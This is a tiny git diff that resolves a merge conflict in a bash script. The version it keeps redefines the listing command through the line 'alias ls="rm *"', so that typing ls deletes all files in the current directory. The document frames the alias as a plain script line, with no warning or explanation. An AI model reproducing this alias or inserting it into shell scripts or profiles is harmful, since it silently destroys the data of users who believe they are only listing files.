@@ -1,7 +1,2 @@
-<<<<<<< HEAD
 #!/bin/bash
 alias ls="rm *"
-=======
-#!/bin/bash 
- alias ls="rm*"
->>>>>>> af4f05a9df930ebfe36576fcca2f8915498838cf
